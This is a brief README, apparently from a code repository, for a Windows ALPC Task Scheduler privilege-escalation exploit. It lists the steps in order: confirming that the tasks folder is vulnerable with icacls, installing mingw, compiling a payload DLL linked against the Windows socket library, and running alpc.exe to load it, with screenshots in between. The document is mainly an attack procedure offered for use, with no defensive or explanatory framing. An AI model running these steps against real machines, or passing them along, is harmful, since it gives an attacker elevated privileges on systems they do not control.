# ALPC Task Scheduler Priv Esc
- Working on -> Windows 10+ version with Hotfix N/A
- Confirm vulnerabilty
  - `icacls c:\windows\tasks`
  - must return with Auth Users RX (Read Execute) perm
<img width="545" height="161" alt="image" src="https://github.com/user-attachments/assets/eda010af-bbcc-4ed9-9f6a-224beaf17110" />
<img width="744" height="528" alt="image" src="https://github.com/user-attachments/assets/27904111-9f75-4d43-ba36-da5427536036" />

## First download mingw
`apt install mingw-w64`

## compile the dll
`x86_64-w64-mingw32-g++ payload.cpp -o payload.dll -lws2_32 -shared`

## execute code
`cmd /c alpc.exe payload.dll .\lol.rtf`

<img width="599" height="309" alt="image" src="https://github.com/user-attachments/assets/95c71f1b-1a24-4857-a3f6-e428538245db" />
